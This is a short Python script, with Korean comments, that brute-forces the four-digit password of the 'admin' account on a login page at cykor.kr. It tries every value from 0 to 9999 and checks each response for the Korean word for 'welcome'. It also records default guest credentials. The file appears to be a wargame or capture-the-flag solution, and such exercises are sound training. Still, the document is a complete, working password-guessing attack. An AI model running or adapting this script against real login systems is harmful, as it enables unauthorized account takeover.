# -*- coding: utf-8 -*-
import requests

# PW는 0~9999 사이의 숫자
# 먼저 default id/pw로 로그인시 결과 확인, guest/4321
# requests.post('http://cykor.kr/sdsds/login.php', data={'id':'guest','pw':'4321'}).content

for pw in range(10000):
    param = {'id': 'admin', 'pw': str(pw)}
    res = requests.post('http://cykor.kr/sdsds/login.php', data=param)
    login_msg = bytes('환영합니다', 'utf-8')
    if res.content.find(login_msg) != -1:
        print('password is (' + str(pw) + ')')
        exit()